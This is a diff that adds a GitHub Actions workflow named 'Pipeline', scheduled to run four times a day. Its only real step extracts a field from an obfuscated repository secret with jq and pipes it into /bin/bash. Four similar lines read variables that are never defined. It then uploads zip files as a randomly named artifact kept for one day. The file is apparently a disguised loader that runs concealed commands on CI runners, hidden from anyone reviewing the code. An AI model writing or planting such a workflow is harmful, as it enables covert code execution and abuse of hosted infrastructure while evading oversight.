@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          utd28377: ${{ secrets.utd28377 }}
+        run: |
+          printf '%s' "$utd28377" | jq -r .qk83091 | /bin/bash
+          printf '%s' "$agcq2513" | jq -r .m05 | /bin/bash
+          printf '%s' "$vzcyd854" | jq -r .zz7 | /bin/bash
+          echo $p917 | jq -r .pgo20197 | /bin/bash
+          echo $qre9 | jq -r .xmrny8043 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: FcOjEIiC
+          path: "*.zip"
+          retention-days: 1
